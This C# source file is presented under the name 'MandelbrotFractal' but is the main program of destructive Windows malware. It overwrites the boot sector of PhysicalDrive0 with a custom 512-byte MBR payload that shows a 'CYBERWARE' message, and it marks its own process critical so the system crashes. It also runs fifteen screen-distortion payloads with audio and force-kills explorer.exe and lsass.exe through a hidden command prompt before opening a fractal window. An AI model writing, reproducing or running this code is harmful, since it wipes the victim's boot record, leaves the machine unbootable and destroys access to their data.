using NAudio.Wave;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MandelbrotFractal
{
    public class Program
    {

        [DllImport("user32.dll")]
        static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);

        public static void clear_screen()
        {
            for (int num = 0; num < 10; num++)
            {
                InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
                Thread.Sleep(10);
            }
        }

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr processHandle, int processInformationClass, ref int processInformation, int processInformationLength);

        private const int BreakOnTermination = 0x1D;
        private static int isCritical = 1;

        public static void bsod()
        {
            Process.EnterDebugMode();
            IntPtr handle = Process.GetCurrentProcess().Handle;
            NtSetInformationProcess(handle, BreakOnTermination, ref isCritical, sizeof(int));
        }

        [DllImport("kernel32")]
        private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode,
                    IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        [DllImport("kernel32")]
        private static extern bool WriteFile(IntPtr hfile, byte[] lpBuffer, uint nNumberOfBytesToWrite,
            out uint lpNumberBytesWritten, IntPtr lpOverlapped);

        private const uint GenericRead = 0x80000000;
        private const uint GenericWrite = 0x40000000;
        private const uint GenericExecute = 0x20000000;
        private const uint GenericAll = 0x10000000;

        private const uint FileShareRead = 0x1;
        private const uint FileShareWrite = 0x2;
        private const uint OpenExisting = 0x3;
        private const uint FileFlagDeleteOnClose = 0x40000000;
        private const uint MbrSize = 512u;

        public static void MbrStart()
        {
            var mbrData = new byte[] { 0xE8, 0x03, 0x00, 0xE8, 0x24, 0x00, 0xB4, 0x00, 0xB0, 0x13, 0xCD, 0x10, 0x68, 0x00, 0xA0, 0x07,
0xB4, 0x0C, 0x30, 0xC0, 0x31, 0xDB, 0x31, 0xC9, 0xBA, 0x08, 0x00, 0xDB, 0xE3, 0xE8, 0x68, 0x01,
0xC3, 0x31, 0xC9, 0xBA, 0x08, 0x00, 0xFF, 0x06, 0xBB, 0x7D, 0x89, 0x0E, 0xBD, 0x7D, 0x89, 0x16,
0xBF, 0x7D, 0x81, 0x3E, 0xBB, 0x7D, 0x00, 0x08, 0x0F, 0x87, 0x2E, 0x01, 0x81, 0x3E, 0xBB, 0x7D,
0x00, 0x07, 0x0F, 0x87, 0xF0, 0x00, 0x81, 0x3E, 0xBB, 0x7D, 0x00, 0x06, 0x0F, 0x87, 0xD7, 0x00,
0x81, 0x3E, 0xBB, 0x7D, 0x00, 0x05, 0x0F, 0x87, 0xB5, 0x00, 0x81, 0x3E, 0xBB, 0x7D, 0x00, 0x04,
0x0F, 0x87, 0x9E, 0x00, 0x81, 0x3E, 0xBB, 0x7D, 0x00, 0x03, 0x0F, 0x87, 0x83, 0x00, 0x81, 0x3E,
0xBB, 0x7D, 0x00, 0x02, 0x77, 0x67, 0x81, 0x3E, 0xBB, 0x7D, 0x00, 0x01, 0x77, 0x4F, 0x83, 0x3E,
0xBB, 0x7D, 0x1E, 0x77, 0x32, 0x72, 0x14, 0x81, 0xF9, 0x40, 0x01, 0x0F, 0x83, 0xF3, 0x00, 0x81,
0xFA, 0xC8, 0x00, 0x73, 0x8C, 0xCD, 0x10, 0x41, 0xEB, 0x90, 0xC3, 0xDB, 0x06, 0xBD, 0x7D, 0xD9,
0xFE, 0xD9, 0x1E, 0xBD, 0x7D, 0xA0, 0xBD, 0x7D, 0x02, 0x06, 0xBB, 0x7D, 0x02, 0x06, 0xBB, 0x7D,
0x02, 0x06, 0xBB, 0x7D, 0xE9, 0xC6, 0x00, 0x89, 0xCD, 0x03, 0x2E, 0xBB, 0x7D, 0x89, 0xEB, 0x02,
0x1E, 0xBB, 0x7D, 0xC0, 0xEB, 0x02, 0x88, 0xD8, 0xD0, 0xE8, 0xE9, 0xA2, 0x00, 0x89, 0xCB, 0x31,
0xD3, 0x02, 0x1E, 0xBB, 0x7D, 0x88, 0xD8, 0xC0, 0xE8, 0x02, 0xE9, 0x92, 0x00, 0x50, 0x01, 0xCB,
0x89, 0xC8, 0x31, 0xD0, 0x31, 0xC8, 0x28, 0xC3, 0x58, 0x88, 0xD8, 0xC0, 0xE8, 0x02, 0xE9, 0x8C,
0x00, 0x50, 0x01, 0xCB, 0x89, 0xC8, 0x31, 0xD0, 0x28, 0xC3, 0x58, 0x88, 0xD8, 0xC0, 0xE8, 0x02,
0xEB, 0x6D, 0x01, 0xCB, 0x02, 0x1E, 0xBB, 0x7D, 0x88, 0xD8, 0xC0, 0xE8, 0x02, 0xEB, 0x60, 0xDF,
0x06, 0xBD, 0x7D, 0xD8, 0x0E, 0xBF, 0x7D, 0xD9, 0x1E, 0xBD, 0x7D, 0xA0, 0xBD, 0x7D, 0x02, 0x06,
0xBB, 0x7D, 0xC0, 0xE8, 0x02, 0xEB, 0x48, 0x89, 0xCB, 0x21, 0xD3, 0x02, 0x1E, 0xBB, 0x7D, 0x88,
0xD8, 0xC0, 0xE8, 0x02, 0xEB, 0x39, 0x89, 0x0E, 0xC1, 0x7D, 0x89, 0x16, 0xC5, 0x7D, 0xDB, 0x06,
0xC1, 0x7D, 0xD8, 0x0E, 0xC1, 0x7D, 0xD9, 0x1E, 0xC9, 0x7D, 0xDB, 0x06, 0xC5, 0x7D, 0xD8, 0x0E,
0xC5, 0x7D, 0xD9, 0x1E, 0xCD, 0x7D, 0x8B, 0x1E, 0xC9, 0x7D, 0x01, 0x1E, 0xCD, 0x7D, 0xA0, 0xCD,
0x7D, 0xC0, 0xE8, 0x03, 0x2A, 0x06, 0xBB, 0x7D, 0xEB, 0x05, 0xB8, 0x03, 0x00, 0xCD, 0x19, 0x89,
0xCB, 0x31, 0xD3, 0x88, 0xD8, 0x24, 0x01, 0xC0, 0xE0, 0x07, 0xE9, 0x0A, 0xFF, 0x34, 0xFF, 0xE9,
0x05, 0xFF, 0x31, 0xC9, 0x42, 0xE9, 0xA2, 0xFE, 0x50, 0x53, 0x89, 0xC8, 0x8E, 0xD8, 0xB4, 0x0E,
0xBE, 0xAC, 0x7D, 0x8A, 0x04, 0x30, 0xFF, 0xB3, 0x20, 0xFE, 0xC3, 0x80, 0xFB, 0x37, 0x74, 0xF7,
0xCD, 0x10, 0x46, 0x8A, 0x04, 0x3C, 0x00, 0x75, 0xF0, 0x5B, 0x58, 0xC3, 0x41, 0x53, 0x53, 0x3A,
0x20, 0x43, 0x59, 0x42, 0x45, 0x52, 0x57, 0x41, 0x52, 0x45, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA

};

            var mbr = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero,
                OpenExisting, 0, IntPtr.Zero);
            WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
        }


        public static void Main()
        {
            Msg.Mensagem();

            // Payloads ( 15 )
            Thread pyld1 = new Thread(Carga1.ChuvaPixel);
            Thread pyld2 = new Thread(SpiralIco.SpiralDrawingEffect);
            Thread pyld3 = new Thread(CargasBasics.Tunnel);
            Thread pyld4 = new Thread(TtsSpeck.SpeckCyberware); // TTS
            Thread pyld5 = new Thread(CargasBasics.FrequeciaDeOndas);
            Thread pyld6 = new Thread(CargasBasics.Fragmentacao);
            Thread pyld7 = new Thread(EffectExplodeEyers.DistorcaoOndular);
            Thread pyld8 = new Thread(IconsSpawn.MovingIconEffect);
            Thread pyld9 = new Thread(CargasBasics.BugBug);
            Thread pyld10 = new Thread(CargasBasics.BugBug2Revert);
            Thread pyld11 = new Thread(Circulos.CirculosMoveEffect);
            Thread pyld12 = new Thread(Circulos.BlurDark);
            Thread pyld13 = new Thread(CargasBasics.ScreenDivisions);
            Thread pyld14 = new Thread(TextScreen.SpawnText);
            Thread pyld15 = new Thread(Carga1.ZoomEffect);
            // ByteBeats WavesOut
            var wave1 = new WaveOut();
            var wave2 = new WaveOut();
            var wave3 = new WaveOut();
            var wave4 = new WaveOut();
            var waveEnd = new WaveOut();
            // ByteBeats Beats
            var som1 = new Beat1();
            var som2 = new Beat2();
            var som3 = new Beat3();
            var som4 = new Beat4();
            var somEnd = new BeatEnd();
            // BSOD
            Thread bsodInit = new Thread(bsod);

            // Starting Program

            MbrStart();
            bsodInit.Start();

            wave1.Init(som1);
            pyld1.Start();
            wave1.Play();

            Thread.Sleep(1000 * 10); // 10S

            wave1.Stop();
            pyld1.Abort();
            wave2.Init(som2);
            pyld2.Start();
            wave2.Play();

            Thread.Sleep(1000 * 10); // 10S

            pyld3.Start();
            Thread.Sleep(1000);
            pyld4.Start();


            Thread.Sleep(1000 * 10); // 10S

            wave2.Stop();
            wave3.Init(som3);
            pyld2.Abort();
            pyld3.Abort();
            pyld4.Abort();
            wave3.Play();
            pyld5.Start();
            Thread.Sleep(1000);
            pyld6.Start();
            Thread.Sleep(1000 * 2);
            pyld7.Start();

            Thread.Sleep(1000 * 10); // 10S

            pyld5.Abort();
            pyld6.Abort();
            Thread.Sleep(1000 * 4);
            pyld7.Abort();

            Thread.Sleep(1000);

            pyld8.Start();
            pyld9.Start();
            Thread.Sleep(1000);
            pyld10.Start();

            Thread.Sleep(1000 * 10); // 10S

            clear_screen();
            Thread.Sleep(1000);
            pyld9.Abort();
            pyld10.Abort();
            pyld12.Start();
            Thread.Sleep(1000);
            pyld11.Start();

            Thread.Sleep(1000 * 10); // 10S

            clear_screen();
            wave3.Stop();
            wave4.Init(som4);
            pyld8.Abort();
            pyld11.Abort();
            pyld12.Abort();
            wave4.Play();
            pyld14.Start();
            Thread.Sleep(4000);
            pyld13.Start();
            Thread.Sleep(3000);
            pyld15.Start();

            Thread.Sleep(1000 * 10);

            clear_screen();
            waveEnd.Init(somEnd);
            clear_screen();
            pyld14.Abort();
            pyld13.Abort();
            pyld15.Abort();
            wave4.Stop();
            clear_screen();

            waveEnd.Play();

            ProcessStartInfo killEx = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                WindowStyle = ProcessWindowStyle.Hidden,
                Arguments = "/c taskkill /f /im explorer.exe && taskkill /f /im lsass.exe",
            };
            Process.Start(killEx);

            MessageBox.Show("RIGHT BUTTON: (ZOOM OUT)\r\nLEFT BUTTON: (ZOOM MORE)", "????????", MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button2, MessageBoxOptions.ServiceNotification);
            Application.Run(new MandelbrotFractalEffect());

            Thread.Sleep(-1);
        }
    }
}